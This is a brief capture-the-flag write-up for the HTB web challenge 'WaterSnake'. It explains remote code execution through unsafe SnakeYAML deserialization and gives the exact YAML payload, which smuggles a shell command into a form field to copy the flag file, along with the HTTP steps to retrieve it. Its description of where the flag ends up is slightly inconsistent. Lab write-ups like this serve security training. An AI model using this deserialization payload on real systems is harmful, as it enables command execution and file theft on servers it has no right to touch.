Challenge: WaterSnake (HTB)<br>
Category: Web <br>
Difficulty: easy <br>
Vulnerability: Remote Code Execution via
unsafe YAML deserialization (SnakeYAML.load()) 
<br>
<h1>Description</h1> The /update endpoint parses attacker-controlled YAML with SnakeYAML.load(), which can instantiate
arbitrary Java objects. By using the !!com.lean.watersnake.GetWaterLevel tag you execute shell commands during
deserialization. <ul>
    <li>POST multipart/form-data to http://{HOST}/update with the config field set to
        !!com.lean.watersnake.GetWaterLevel ["cp /flag.txt /app/build/resources/main/static/flag.txt"].</li>
    <li>Once deserialized, the server runs the cp command and places the flag in /flag.txt.</li>
    <li>GET http://{HOST}/flag.txt to retrieve the flag.</li>
</ul>
